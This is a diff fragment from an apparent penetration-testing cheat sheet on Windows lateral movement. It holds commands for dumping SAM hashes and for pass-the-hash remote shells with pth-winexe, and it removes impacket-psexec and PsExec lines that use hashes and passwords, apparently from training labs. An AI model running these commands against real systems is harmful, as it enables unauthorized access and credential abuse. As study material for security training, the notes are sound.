@@ -328,11 +328,6 @@ impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfi
 #### Other Tools
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd (winexesvc service)
-
-impacket-psexec OFFSEC.LOCAL/Administrator@192.168.176.57 -hashes "aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5" (135/445 port required，C$, Admin$ is writable)
-impacket-psexec domain/Administrator:password@192.168.1.140 (135/445 port required, C$ Admin$ is writable)
-
-PsExec.exe \\192.168.1.104 -u administrator -p Ignite@123 cmd (135/445 port required)
 ```
 
 #### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
